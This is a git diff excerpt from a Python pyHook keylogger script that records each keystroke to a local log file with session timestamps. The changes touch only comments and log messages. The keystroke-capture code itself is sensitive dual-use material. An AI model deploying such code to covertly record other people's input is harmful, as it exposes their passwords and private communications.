@@ -22,7 +22,7 @@ def OnKeyboardEvent(event):
     print('Transition', event.Transition)
     print('---')
 
-    # TODO handle output
+    # TODO cleanup and handle output
     # TODO check for when WindowName has changed.
     f = open('log_file.txt', 'a')
     # if lastWindow != event.WindowName:
@@ -34,11 +34,12 @@ def OnKeyboardEvent(event):
         f.write('\n')
     elif event.Key == 'Oem_Period':
         f.write('.')
+    # TODO fix backspace
     elif event.Key == 'Back':
         f.seek(-1, os.SEEK_END)
         f.truncate()
     elif event.Key == 'F10':
-        f.write('\nNew Keylogging session ended at ' + strftime("%a, %d %b %Y %X") + '\n')
+        f.write('\nKeylogging session ended at ' + strftime("%a, %d %b %Y %X") + '\n')
         exit(0)
     else:
         f.write(event.Key)
@@ -46,7 +47,7 @@ def OnKeyboardEvent(event):
     return True
 
 f = open('log_file.txt', 'a')
-f.write('\nNew Keylogging session started at ' + strftime("%a, %d %b %Y %X") + '\n')
+f.write('\nKeylogging session started at ' + strftime("%a, %d %b %Y %X") + '\n')
 f.close()
 # create a hook manager
 hm = pyHook.HookManager()
